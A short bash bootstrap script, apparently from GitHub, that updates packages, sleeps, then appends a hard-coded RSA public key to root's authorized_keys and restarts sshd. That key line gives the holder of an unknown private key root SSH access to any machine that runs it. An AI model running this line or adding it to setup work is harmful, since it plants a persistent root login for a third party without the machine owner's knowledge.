#!/bin/bash
s="echo 'sleep2s' && sleep 2s"
echo from github
echo "apt-get update"
apt-get update
echo "sleep 2s"
sleep 2s
$s
echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAhydYLT6JTiIdxQw5nJlkyTwgwIwWLeu7dpz4+Xnvv24tEFIDkthTFgVnSbXe1NzP9VsosSmQr22qByTQ3NLCgKeZYNCSS+LfDksSl1twTFNFr5u2J8o/B+sGyA5YuFIoBwJw/m580C99zhjn75S+ndsthlWCIsdPd3UBXU1l48t2iH7JUTMXdnUNQtQnga2L+WFhW6YuIGGGgEwuCd/fqi8K0SQ3k6fVE/dtf1A5ivSKuUk2qPdnaCcMQa2OlrR6+OvBVouSqgO/nGkDiE5bXkflBon8c71sf6/h3Mk7UbNG2T/hkLM1vGRg+gkQ3W4JUdRoNx8ZbQoS4TO4fJMF1Q== rsa-key-20200602" >> /root/.ssh/authorized_keys
service sshd restart
